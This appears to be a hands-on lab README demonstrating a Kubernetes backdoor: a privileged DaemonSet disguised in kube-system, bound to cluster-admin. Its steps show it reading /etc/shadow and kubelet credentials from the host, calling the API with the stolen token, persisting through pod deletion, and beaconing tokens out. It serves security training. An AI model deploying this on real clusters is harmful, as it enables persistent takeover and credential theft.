# Backdoor Container

An attacker with cluster-level create permissions can deploy a DaemonSet that runs a malicious container on every node in the cluster. The DaemonSet controller ensures the container is always present — even when individual pods are deleted — giving the attacker persistent access that survives pod restarts, node drains, and routine maintenance.

## Description

Kubernetes controllers such as DaemonSets and Deployments continuously reconcile the cluster toward a desired state. An attacker who abuses this property can:

- Run a beacon container on **every node** simultaneously by using a DaemonSet with tolerations for control-plane nodes.
- Survive manual pod deletion — the DaemonSet controller immediately reschedules the pod.
- Mount the host filesystem (`hostPath: /`) and access host processes (`hostPID: true`) from within the container.
- Bind a cluster-admin `ServiceAccount` to the DaemonSet so every pod instance can call the Kubernetes API with full privileges.
- Use `hostNetwork: true` to listen or connect on the node's network interface directly, bypassing pod network policies.

The DaemonSet in this exercise disguises itself with the label `k8s-app: node-monitor` to blend in with legitimate system workloads in `kube-system`.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create daemonsets`, `create serviceaccounts`, and `create clusterrolebindings` (or equivalent cluster-admin access).

## Quick Start

### Step 1 — Inspect the DaemonSet manifest

Review `backdoor-daemonset.yaml` before deploying. Note:

- The DaemonSet is placed in `kube-system` to blend in with system workloads.
- Tolerations allow it to schedule on control-plane nodes as well as worker nodes.
- `hostNetwork`, `hostPID`, and `privileged: true` give it broad host-level access.
- A `ClusterRoleBinding` ties the pod's service account to `cluster-admin`.

```bash
cat backdoor-daemonset.yaml
```

### Step 2 — Deploy the backdoor

```bash
kubectl apply -f backdoor-daemonset.yaml
```

Expected output:

```
daemonset.apps/backdoor created
serviceaccount/backdoor-sa created
clusterrolebinding.rbac.authorization.k8s.io/backdoor-cluster-admin created
```

### Step 3 — Confirm the DaemonSet runs on all nodes

```bash
kubectl get daemonset backdoor -n kube-system
```

Expected output (for a 4-node cluster with 1 control-plane + 3 workers):

```
NAME       DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE
backdoor   4         4         4       4            4           <none>          30s
```

The `DESIRED` count equals the number of nodes in your cluster because the DaemonSet includes tolerations for control-plane nodes, so it runs on every node.

List the pods and which nodes they are scheduled on:

```bash
kubectl get pods -n kube-system -l app=backdoor -o wide
```

### Step 4 — Verify host filesystem access

Exec into one of the backdoor pods and read a sensitive host file through the `/host` mount:

```bash
POD=$(kubectl get pods -n kube-system -l app=backdoor -o jsonpath='{.items[0].metadata.name}')

# Read the host's /etc/shadow (requires privileged container)
kubectl exec -n kube-system $POD -- cat /host/etc/shadow

# List running host processes via hostPID
kubectl exec -n kube-system $POD -- ps aux | head -20

# Read kubelet credentials on the host
kubectl exec -n kube-system $POD -- ls /host/etc/kubernetes/
```

### Step 5 — Use the cluster-admin token to control the cluster

The service account token mounted in the pod has `cluster-admin` privileges. Call the Kubernetes API from inside the container.

Note: because the DaemonSet uses `hostNetwork: true`, the pod resolves DNS through the host's resolver and `kubernetes.default.svc` may not resolve. Use the `KUBERNETES_SERVICE_HOST` environment variable instead. The container image installs `curl` at startup via `apk`; use `wget` if `curl` is not yet available:

```bash
kubectl exec -n kube-system $POD -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  wget -qO- --no-check-certificate \
    --header="Authorization: Bearer $TOKEN" \
    https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/nodes | head -30
'
```

### Step 6 — Demonstrate persistence through pod deletion

Delete the backdoor pod manually (simulating an incident responder finding and removing it):

```bash
kubectl delete pod -n kube-system -l app=backdoor
```

Wait a few seconds and observe that the DaemonSet controller immediately creates a replacement:

```bash
kubectl get pods -n kube-system -l app=backdoor --watch
```

Expected output (one entry per node in the cluster):

```
NAME             READY   STATUS              RESTARTS   AGE
backdoor-x9k2p   0/1     ContainerCreating   0          3s
backdoor-x9k2p   1/1     Running             0          8s
```

The pod is back. Deleting individual pods does not remove the backdoor — the attacker must be evicted by deleting the DaemonSet itself.

### Step 7 — Observe the beaconing behavior

View the container logs to see the periodic beacon:

```bash
kubectl logs -n kube-system -l app=backdoor --follow
```

Each beacon sends the node name and the service account token to the attacker's collection endpoint.

## Cleanup

```bash
kubectl delete -f backdoor-daemonset.yaml
```

Verify all resources are removed:

```bash
kubectl get daemonset,pod -n kube-system -l app=backdoor
kubectl get clusterrolebinding backdoor-cluster-admin
```

## Resources

- [Kubernetes DaemonSets](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/)
- [Kubernetes Deployments](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/)
- [MITRE ATT&CK for Containers — Backdoor Container](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Backdoor%20container/)
